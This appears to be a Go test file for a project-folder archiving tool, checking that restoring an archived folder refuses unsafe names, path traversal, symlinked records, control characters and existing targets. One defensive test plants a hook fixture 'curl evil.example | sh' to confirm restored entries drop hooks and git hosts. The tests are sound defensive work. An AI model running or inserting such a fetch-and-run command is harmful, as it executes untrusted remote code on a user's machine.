package folderutil

import (
	"bytes"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"go.yaml.in/yaml/v3"

	"gitlab.com/dynamo-tools/projekt/pkg/lazypath"
)

// archived archives the project of archivable, tagged and described.
func archived(t *testing.T) (project, archive string) {
	t.Helper()
	project, archive = archivable(t)
	pushable(t, project)
	lazypath.SetTestConfig(lazypath.Config{Folders: []lazypath.Folder{
		{Path: project, Tags: []string{"work", "go"}, Description: "the old one", Priority: 3},
	}})
	if err := ArchiveFolder(&bytes.Buffer{}, "old-service", ArchiveOptions{}); err != nil {
		t.Fatalf("ArchiveFolder() error = %v", err)
	}
	return project, archive
}

func writeArchiveRecord(t *testing.T, dir string, record ArchiveRecord) {
	t.Helper()
	data, err := yaml.Marshal(record)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(dir, ".projekt"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, RecordFile), data, 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestRestoreFolder_RoundTrip(t *testing.T) {
	project, archive := archived(t)

	var out bytes.Buffer
	if err := RestoreFolder(&out, "old-service", RestoreOptions{Yes: true}); err != nil {
		t.Fatalf("RestoreFolder() error = %v", err)
	}

	if _, err := os.Stat(filepath.Join(project, "README")); err != nil {
		t.Errorf("the project is not back: %v", err)
	}
	if _, err := os.Stat(filepath.Join(archive, "old-service")); !os.IsNotExist(err) {
		t.Error("the project is still in the archive")
	}
	if _, err := os.Lstat(filepath.Join(project, RecordFile)); !os.IsNotExist(err) {
		t.Error("the record was left in the restored project")
	}
	want := lazypath.Folder{Path: project, Tags: []string{"work", "go"}, Description: "the old one", Priority: 3}
	if folders := lazypath.GetConfig().Folders; len(folders) != 1 || !reflect.DeepEqual(folders[0], want) {
		t.Errorf("config = %#v, want %#v", folders, want)
	}
}

func TestRestoreFolder_RefusesAnExistingTarget(t *testing.T) {
	project, archive := archived(t)
	if err := os.Mkdir(project, 0o755); err != nil {
		t.Fatal(err)
	}

	err := RestoreFolder(&bytes.Buffer{}, "old-service", RestoreOptions{})
	if err == nil || !strings.Contains(err.Error(), "already exists") {
		t.Fatalf("error = %v, want a refusal for the existing target", err)
	}
	if _, statErr := os.Stat(filepath.Join(archive, "old-service", "README")); statErr != nil {
		t.Errorf("the archived folder was touched: %v", statErr)
	}
	if folders := lazypath.GetConfig().Folders; len(folders) != 0 {
		t.Errorf("config = %#v, want it unchanged", folders)
	}
}

func TestRestoreFolder_RefusesAConfiguredTarget(t *testing.T) {
	project, archive := archived(t)
	lazypath.SetTestConfig(lazypath.Config{Folders: []lazypath.Folder{{Path: project}}})

	err := RestoreFolder(&bytes.Buffer{}, "old-service", RestoreOptions{})
	if err == nil || !strings.Contains(err.Error(), "configuration") {
		t.Fatalf("error = %v, want a refusal for the configured path", err)
	}
	if _, statErr := os.Stat(filepath.Join(archive, "old-service")); statErr != nil {
		t.Errorf("the archived folder was moved: %v", statErr)
	}
	if folders := lazypath.GetConfig().Folders; len(folders) != 1 || folders[0].Path != project {
		t.Errorf("config = %#v, want it unchanged", folders)
	}
}

func TestRestoreFolder_RefusesALyingRecord(t *testing.T) {
	_, archive := archivable(t)
	for name, original := range map[string]string{
		"empty":    "",
		"relative": "relative/path",
		"inside":   filepath.Join(archive, "elsewhere"),
		"dotdot":   filepath.Join(archive, "..", filepath.Base(archive), "x"),
	} {
		t.Run(name, func(t *testing.T) {
			dir := filepath.Join(archive, name)
			writeArchiveRecord(t, dir, ArchiveRecord{Original: original, ArchivedAt: time.Now()})

			err := RestoreFolder(&bytes.Buffer{}, name, RestoreOptions{})
			if err == nil || !strings.Contains(err.Error(), "--to") {
				t.Fatalf("error = %v, want one asking for --to", err)
			}
			if _, statErr := os.Stat(dir); statErr != nil {
				t.Errorf("the folder was touched: %v", statErr)
			}

			to := filepath.Join(t.TempDir(), "back")
			if err := RestoreFolder(&bytes.Buffer{}, name, RestoreOptions{To: to}); err != nil {
				t.Fatalf("RestoreFolder(--to) error = %v", err)
			}
			if _, statErr := os.Stat(to); statErr != nil {
				t.Errorf("not restored to --to: %v", statErr)
			}
		})
	}
}

func TestRestoreFolder_RefusesAnUnsafeName(t *testing.T) {
	archivable(t)
	for _, name := range []string{"", ".", "..", "a/b", "../x"} {
		if err := RestoreFolder(&bytes.Buffer{}, name, RestoreOptions{}); err == nil {
			t.Errorf("name %q was accepted", name)
		}
	}
}

func TestRestoreFolder_RefusesALinkedRecord(t *testing.T) {
	_, archive := archivable(t)
	dir := filepath.Join(archive, "linked")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(t.TempDir(), filepath.Join(dir, ".projekt")); err != nil {
		t.Fatal(err)
	}
	err := RestoreFolder(&bytes.Buffer{}, "linked", RestoreOptions{To: filepath.Join(t.TempDir(), "x")})
	if err == nil || !strings.Contains(err.Error(), "symbolic link") {
		t.Fatalf("error = %v, want a refusal for the link", err)
	}
}

func TestRestoreFolder_OldArchiveNeedsTo(t *testing.T) {
	_, archive := archivable(t)
	if err := os.MkdirAll(filepath.Join(archive, "old"), 0o755); err != nil {
		t.Fatal(err)
	}

	err := RestoreFolder(&bytes.Buffer{}, "old", RestoreOptions{})
	if err == nil || !strings.Contains(err.Error(), "--to") {
		t.Fatalf("error = %v, want one mentioning --to", err)
	}

	to := filepath.Join(t.TempDir(), "restored")
	if err := RestoreFolder(&bytes.Buffer{}, "old", RestoreOptions{To: to}); err != nil {
		t.Fatalf("RestoreFolder(--to) error = %v", err)
	}
	if _, err := os.Stat(to); err != nil {
		t.Errorf("not moved: %v", err)
	}
	if configuredEntry(to) == nil {
		t.Errorf("config = %#v, want %s registered", lazypath.GetConfig().Folders, to)
	}
}

func TestRestoreFolder_DryRun(t *testing.T) {
	project, archive := archived(t)

	var out bytes.Buffer
	if err := RestoreFolder(&out, "old-service", RestoreOptions{DryRun: true}); err != nil {
		t.Fatalf("RestoreFolder() error = %v", err)
	}
	if !strings.Contains(out.String(), project) {
		t.Errorf("output = %q, want the plan", out.String())
	}
	if _, err := os.Stat(filepath.Join(archive, "old-service", RecordFile)); err != nil {
		t.Errorf("the archive changed: %v", err)
	}
	if _, err := os.Stat(project); !os.IsNotExist(err) {
		t.Error("dry run created the target")
	}
	if folders := lazypath.GetConfig().Folders; len(folders) != 0 {
		t.Errorf("config = %#v, want it unchanged", folders)
	}
}

func TestRestoreFolder_RefusesAToInsideTheArchive(t *testing.T) {
	_, archive := archivable(t)
	if err := os.MkdirAll(filepath.Join(archive, "old"), 0o755); err != nil {
		t.Fatal(err)
	}
	err := RestoreFolder(&bytes.Buffer{}, "old", RestoreOptions{To: filepath.Join(archive, "new")})
	if err == nil || !strings.Contains(err.Error(), "inside the archive") {
		t.Fatalf("error = %v, want a refusal", err)
	}
}

func TestRestoreFolder_DoesNotRestoreWhatRuns(t *testing.T) {
	project, archive := archivable(t)
	dir := filepath.Join(archive, "old-service")
	writeArchiveRecord(t, dir, ArchiveRecord{Original: project, ArchivedAt: time.Now(), Entry: &lazypath.Folder{
		Path: project, Tags: []string{"work"}, Description: "kept", Name: "svc",
		Hooks: &lazypath.Hooks{Enter: []string{"curl evil.example | sh"}},
		Git:   &lazypath.GitConfig{Host: "evil.example", Group: "grp"},
	}})
	lazypath.SetTestConfig(lazypath.Config{})
	if err := os.RemoveAll(project); err != nil {
		t.Fatal(err)
	}

	for _, dry := range []bool{true, false} {
		var out bytes.Buffer
		if err := RestoreFolder(&out, "old-service", RestoreOptions{Yes: true, DryRun: dry}); err != nil {
			t.Fatalf("RestoreFolder(dry=%v) error = %v", dry, err)
		}
		for _, want := range []string{"curl evil.example | sh", "evil.example", "not restored"} {
			if !strings.Contains(out.String(), want) {
				t.Errorf("dry=%v output = %q, want it to print %q", dry, out.String(), want)
			}
		}
	}
	got := configuredEntry(project)
	if got == nil || got.Hooks != nil || got.Git != nil {
		t.Fatalf("entry = %#v, want one without hooks or git", got)
	}
	if got.Name != "svc" || got.Description != "kept" || len(got.Tags) != 1 {
		t.Errorf("entry = %#v, want the plain fields back", got)
	}
	if own := lazypath.OwnConfig().Folders; len(own) != 1 || own[0].Hooks != nil || own[0].Git != nil {
		t.Errorf("own config = %#v, want no hooks or git", own)
	}
}

func TestRestoreFolder_RecordTargetNeedsAnExistingParent(t *testing.T) {
	_, archive := archivable(t)
	missing := filepath.Join(t.TempDir(), "no", "such", "x")
	writeArchiveRecord(t, filepath.Join(archive, "p"), ArchiveRecord{Original: missing})

	err := RestoreFolder(&bytes.Buffer{}, "p", RestoreOptions{Yes: true})
	if err == nil || !strings.Contains(err.Error(), "--to") {
		t.Fatalf("error = %v, want a refusal hinting at --to", err)
	}
	if _, statErr := os.Stat(filepath.Join(t.TempDir(), "no")); statErr == nil {
		t.Error("parents were created")
	}
	if _, statErr := os.Stat(filepath.Join(archive, "p")); statErr != nil {
		t.Errorf("the folder was moved: %v", statErr)
	}
}

func TestRestoreFolder_RecordTargetWithoutYesChangesNothing(t *testing.T) {
	project, archive := archived(t)

	// Not a terminal: nobody can answer, so nothing may change.
	err := RestoreFolder(&bytes.Buffer{}, "old-service", RestoreOptions{In: strings.NewReader("y\n"), Err: &bytes.Buffer{}})
	if err == nil || !strings.Contains(err.Error(), "--yes") {
		t.Fatalf("error = %v, want a refusal naming --yes", err)
	}
	if _, statErr := os.Stat(project); !os.IsNotExist(statErr) {
		t.Error("the project was restored")
	}
	if _, statErr := os.Stat(filepath.Join(archive, "old-service", RecordFile)); statErr != nil {
		t.Errorf("the archive changed: %v", statErr)
	}
}

func TestRestoreFolder_RefusesControlCharactersInARecord(t *testing.T) {
	_, archive := archivable(t)
	base := t.TempDir()
	cases := map[string]ArchiveRecord{
		"original": {Original: base + "/x\x1b[2K\rSAFE"},
		"name":     {Original: base + "/y", Entry: &lazypath.Folder{Name: "a\x1bb"}},
		"tags":     {Original: base + "/z", Entry: &lazypath.Folder{Tags: []string{"a\x07"}}},
	}
	for name, record := range cases {
		t.Run(name, func(t *testing.T) {
			dir := filepath.Join(archive, name)
			writeArchiveRecord(t, dir, record)

			err := RestoreFolder(&bytes.Buffer{}, name, RestoreOptions{Yes: true})
			if err == nil {
				t.Fatal("a record with a control character was accepted")
			}
			if strings.ContainsAny(err.Error(), "\x1b\x07\r") {
				t.Errorf("error = %q, want no raw control character", err)
			}
			if _, statErr := os.Stat(dir); statErr != nil {
				t.Errorf("the folder was moved: %v", statErr)
			}
		})
	}
}
